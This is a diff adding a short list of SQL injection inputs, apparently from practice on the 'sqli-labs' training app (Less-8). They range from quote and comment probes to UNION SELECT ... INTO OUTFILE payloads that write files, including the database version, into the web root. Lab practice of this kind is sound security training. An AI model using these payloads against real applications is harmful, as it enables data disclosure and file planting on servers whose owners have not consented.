@@ -1,0 +1,14 @@
+ID:1
+ID:1\
+ID:1
+ID:\
+ID:1' -- 
+ID:1" -- 
+ID:1)) -- 
+ID:1  -- 
+ID:1
+ID:1\
+ID:1\
+ID:1'  -- 
+ID:1'  union select 1,2,3 into outfile '/var/www/html/sqli-labs/Less-8/u.txt' -- 
+ID:1'  union select 1,2,version() into outfile '/var/www/html/sqli-labs/Less-8/u1.txt' -- 
